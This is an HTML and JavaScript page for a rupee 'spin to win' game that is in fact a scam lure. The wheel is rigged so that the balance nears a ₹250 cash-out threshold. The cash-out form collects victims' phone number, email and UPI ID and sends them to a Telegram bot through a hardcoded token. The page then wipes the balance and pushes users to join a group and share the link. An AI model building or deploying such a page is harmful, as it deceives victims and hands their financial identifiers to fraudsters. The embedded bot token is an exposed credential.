<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>

body{
  margin:0;
  font-family:Arial;
  background: radial-gradient(circle,#6a11cb,#2d014d);
  color:white;
  text-align:center;
}

.topBtns{
  display:flex;
  justify-content:space-around;
  margin-top:10px;
}
.icon{width:45px;}
.topBtn{
  padding:8px 15px;
  border-radius:20px;
  background:linear-gradient(purple,pink);
}
.cash{
  background:gold;
  color:black;
}

.balance{
  font-size:28px;
  margin-top:10px;
}

.progressBox{
  width:85%;
  margin:auto;
  background:#aaa;
  border-radius:20px;
}
.progress{
  height:10px;
  width:0%;
  background:linear-gradient(orange,yellow);
  border-radius:20px;
}

.pointer{
  width:0;
  height:0;
  border-left:12px solid transparent;
  border-right:12px solid transparent;
  border-bottom:25px solid yellow;
  margin:10px auto;
}

.wheelBox{
  width:280px;
  height:280px;
  margin:20px auto;
  position:relative;
}

.wheel{
  width:100%;
  height:100%;
  border-radius:50%;
  background:url("wheel.jpg") center/contain no-repeat;
  background-color:black;
  transition: transform 2s ease-out;
}

.center{
  position:absolute;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  width:80px;
  height:80px;
  background:black;
  border-radius:50%;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  cursor:pointer;
}

.btn{
  padding:10px 20px;
  border-radius:20px;
  background:orange;
  margin:5px;
}

.bigInvite{
  margin:20px;
  padding:15px;
  background:linear-gradient(45deg,purple,pink);
  border-radius:20px;
}

</style>
</head>

<body>

<div class="topBtns">
  <div>
    <img src="https://cdn-icons-png.flaticon.com/512/2583/2583344.png" class="icon"><br>
    <div class="topBtn">Rank</div>
  </div>

  <div>
    <img src="https://cdn-icons-png.flaticon.com/512/4140/4140048.png" class="icon"><br>
    <div class="topBtn">Invitation</div>
  </div>

  <div>
    <img src="https://cdn-icons-png.flaticon.com/512/2331/2331943.png" class="icon"><br>
    <div class="topBtn cash" onclick="openCash()">Cash Out</div>
  </div>
</div>

<div class="balance">₹<span id="bal">0</span></div>

<div class="progressBox">
  <div class="progress" id="progress"></div>
</div>

<p id="leftText"></p>

<div class="pointer"></div>

<div class="wheelBox">
  <div id="wheel" class="wheel"></div>

  <div class="center" onclick="spin()">
    <span id="spins">3</span>
    <small>Spins</small>
  </div>
</div>

<button class="btn" onclick="join()">+1 Spin</button>
<button class="btn" onclick="more()">More</button>

<div class="bigInvite">
  <h3>Invite for Spins!</h3>
  <button class="btn" onclick="copyLink()">Copy Link</button>
</div>

<!-- CASHOUT FORM -->
<div id="cashBox" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999;">
  <div style="background:linear-gradient(purple,pink);margin:50px 15px;padding:20px;border-radius:20px;">
    <h2>Cash Out</h2>

    <input id="ph" placeholder="Phone Number" style="width:90%;padding:10px;margin:8px;border-radius:10px;border:none;"><br>
    <input id="email" placeholder="Email" style="width:90%;padding:10px;margin:8px;border-radius:10px;border:none;"><br>
    <input id="upi" placeholder="UPI ID" style="width:90%;padding:10px;margin:8px;border-radius:10px;border:none;"><br>

    <button onclick="submitCash()" class="btn">Proceed</button>
    <button onclick="closeCash()" class="btn">Close</button>
  </div>
</div>

<script>

let balance=0, spins=3, spinCount=0, rotate=0;
let isAdmin = true; // 🔥 unlimited spins

const bal = document.getElementById("bal");
const spinsText = document.getElementById("spins");
const progress = document.getElementById("progress");
const leftText = document.getElementById("leftText");
const wheel = document.getElementById("wheel");

function update(){
  bal.innerText=balance;
  spinsText.innerText=spins;

  let percent=(balance/250)*100;
  if(percent>100) percent=100;
  progress.style.width=percent+"%";

  let left = 250 - balance;
  leftText.innerText = left<=0 
    ? "🎉 You can withdraw now!" 
    : "Only ₹"+Math.ceil(left)+" to cash out ₹250!";
}

function spin(){
  if(spins<=0 && !isAdmin){
    alert("No spins");
    return;
  }

  if(!isAdmin) spins--;

  spinCount++;

  let win;
  if(spinCount==1){
    win=Math.floor(Math.random()*31)+150;
  }else if(spinCount==2){
    win=Math.floor(Math.random()*10)+1;
  }else{
    win=Math.floor(Math.random()*5)+1;
  }

  balance+=win;

  rotate += 720 + Math.floor(Math.random()*360);
  wheel.style.transform = "rotate("+rotate+"deg)";

  setTimeout(()=>{
    alert("You won ₹"+win);
    update();
  },2000);
}

function openCash(){
  if(balance < 250){
    alert("Minimum ₹250 required");
    return;
  }
  document.getElementById("cashBox").style.display="block";
}

function closeCash(){
  document.getElementById("cashBox").style.display="none";
}

function submitCash(){
  let ph = document.getElementById("ph").value;
  let email = document.getElementById("email").value;
  let upi = document.getElementById("upi").value;

  if(!ph || !email || !upi){
    alert("Fill all details");
    return;
  }

  let BOT_TOKEN = "8608797876:AAF-RKV52vT8sd0FDrYj4avkb7n8zVWurjs";
  let CHAT_ID = "7580298442";

  let text = 
  "💸 New Withdrawal Request\n\n" +
  "📱 Phone: " + ph + "\n" +
  "📧 Email: " + email + "\n" +
  "🏦 UPI: " + upi + "\n" +
  "💰 Amount: ₹" + balance;

  fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text));

  alert("Request Sent to Admin ✅");

  balance = 0;
  update();
  closeCash();
}

function join(){
  window.open("https://t.me/+fo5RTULOJ3c5N2Q9","_blank");
}

function more(){
  alert("Coming soon...");
}

function copyLink(){
  navigator.clipboard.writeText(location.href);
  alert("Copied!");
}

update();

</script>

</body>
</html>
